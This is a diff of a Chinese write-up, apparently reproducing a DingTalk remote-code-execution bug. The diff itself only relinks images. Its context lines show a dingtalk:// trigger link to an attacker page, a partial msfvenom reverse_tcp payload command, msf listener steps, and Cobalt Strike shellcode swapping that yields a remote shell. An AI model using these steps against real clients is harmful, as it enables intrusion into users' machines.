@@ -64,7 +64,7 @@ schema_version: "1"
 二、poc：
 ======
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxlnGfLbyVZqboaDqJK14mMzfcibxOmHzibLFbMpibp34nd2a0TZJqicvAqxh0H1PYkapANia7Bxrcial6w/640?wx_fmt=jpeg&from=appmsg)
+![](../../.resource/remote/b7b98b439de6b273af3ee4f63dc65408348a5178464a3fbc143f7e686cf0ee72.jpg)
 
 三、触发方式
 ======
@@ -76,7 +76,7 @@ dingtalk://dingtalkclient/page/link?url=x.x.x.x/calc.html&pc_slide=true
 
 #### 漏洞证明：
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxlnGfLbyVZqboaDqJK14mMvBupvTOsrLUFDzIThyDeEyJNUlKYChzVEzciaO6BVO0TzOedA2K9ibRQ/640?wx_fmt=jpeg&from=appmsg)
+![](../../.resource/remote/556d576a38478056a1136bc225a0cf8d07034d87166a29836cfd5753846e955c.jpg)
 
 四、msf 反弹 shell
 ==============
@@ -89,7 +89,7 @@ msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=x.x.
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxlnGfLbyVZqboaDqJK14mMVgQrAXU2tic5iblKguyFAtFRf617wujeM2SLBJNDeibGS1IwBDIFFY5tQ/640?wx_fmt=jpeg&from=appmsg)
+![](../../.resource/remote/e92ea95f4a5858224f17a80e44191092887a19b1e9d095305982a43f5f854f63.jpg)
 
 msf 开启监听
 --------
@@ -105,7 +105,7 @@ run
 将生成的 shellcode 替换原 shellcode
 ----------------------------
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxlnGfLbyVZqboaDqJK14mMlB5ySCUPhia9TnjW8Tj7siaibgltktQCarAl14wFZBRAibRyy9oYogM9wA/640?wx_fmt=jpeg&from=appmsg)
+![](../../.resource/remote/f325d4a9738330c6cf9cff35e7c4a96d2ec709b0bd188702c6d251dbde9574f4.jpg)
 
 需要替换的位置为
 --------
@@ -126,7 +126,7 @@ dingtalk://dingtalkclient/page/link?url=http://x.x.x.x/msf.html&pc_slide=true
 漏洞证明
 ----
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxlnGfLbyVZqboaDqJK14mMvGnsGvQOLeAlEzqOSmibFmzIrpOntk1TGdvrKrV8u3NVe1qGvtCAbUQ/640?wx_fmt=jpeg&from=appmsg)
+![](../../.resource/remote/82bd6d520b13ff0d04f519b58aea55a94d935e8b747cd91e8ae5fe30072d7b1e.jpg)
 
 五、cs 反弹 shell
 =============
@@ -134,15 +134,15 @@ dingtalk://dingtalkclient/page/link?url=http://x.x.x.x/msf.html&pc_slide=true
 cs 生成 c# 的 shellcode
 --------------------
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxlnGfLbyVZqboaDqJK14mM2S9OWu1EQJbhQ0IJ3ZY5HAKVIrmN3c9s8jt94Cgqj3Dj06QH75peYQ/640?wx_fmt=jpeg&from=appmsg)
+![](../../.resource/remote/b6042aabf5b1c49822ca15f21fd3aa1b0869cda8d55bdacdd7fbf25bf3df2e41.jpg)
 
 不要勾选 x64
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxlnGfLbyVZqboaDqJK14mMuqSefJ3FEWLaK3W2MjbVRC4xTqjVwicAYTHtENgOoDiafQlRmkbaNpCQ/640?wx_fmt=jpeg&from=appmsg)
+![](../../.resource/remote/3fd689a8f0ab2efdeec9d14c7e47522dc9b8b982084ef18963fd10ac13d7ef6a.jpg)
 
 将生成的 shellcode 替换原 shellcode
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxlnGfLbyVZqboaDqJK14mMT1spsXCxqoYv8zzjYibysjm3icRcSCkKicYe0rf8awVcGtUfVcDCj8Ryg/640?wx_fmt=jpeg&from=appmsg)
+![](../../.resource/remote/71043c391660fd8d58973e687ab1c8f0732593b949a9ddec72ac463bace2a476.jpg)
 
 需要替换的位置为
 --------
@@ -163,7 +163,7 @@ dingtalk://dingtalkclient/page/link?url=http://x.x.x.x/cs.html&pc_slide=true
 成功上线 cs
 -------
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/v94hWOZcBpxlnGfLbyVZqboaDqJK14mMwS2vzI2dK4qZYCiaW1IO128dI5s6aJV6AoPkLTWrBEMH8xj4ribMpI6w/640?wx_fmt=jpeg&from=appmsg)
+![](../../.resource/remote/15037695efc895233b50711b377dd3e7fb2452b9b1111014e76316d36aea6264.jpg)
 
 网络安全感悟
 ======
